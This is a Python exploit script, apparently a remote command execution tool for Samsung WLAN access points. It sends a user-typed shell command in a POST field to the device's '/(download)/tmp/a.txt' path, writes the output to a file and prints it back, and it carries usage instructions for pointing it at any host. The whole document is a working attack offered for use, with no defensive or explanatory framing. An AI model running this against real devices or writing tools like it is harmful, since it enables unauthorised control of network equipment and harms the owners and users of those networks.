import requests
import sys


def Payload(urlL):
    url = 'http://'+urlL+'/(download)/tmp/a.txt'
    url = url.replace(" ","")
    url = url.replace("\n","")
    res = ''
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36','Connection': 'close'}
    data = {'command1':'shell:'+cmd+'| dd of=/tmp/a.txt'}

   
    try:
        print('Check....................            ')
        req = requests.post(url,data=data,headers=headers,timeout=5)
        if req.text != "":
            print('漏洞存在')
            res = req.text
            print(res)
        
        else: 
            res = '漏洞不存在'
            print(res)
    except:
        print('[-] Target Not Vuln or command unavailable')


while 1:
    if len(sys.argv)!=2:
        print('+-------------------------------------------------------------+')
        print('+                   Samsung WLAN AP rce                       +')
        print('+-------------------------------------------------------------+')
        print('+ USE: python3 <filename> <host>                              +')
        print('+ EXP: python3 Samsung_rce.py 1.1.1.1                         +')
        print('+-------------------------------------------------------------+')
        sys.exit()
    urlL = sys.argv[1]
    cmd = input('Please input command:')
    Payload(urlL)
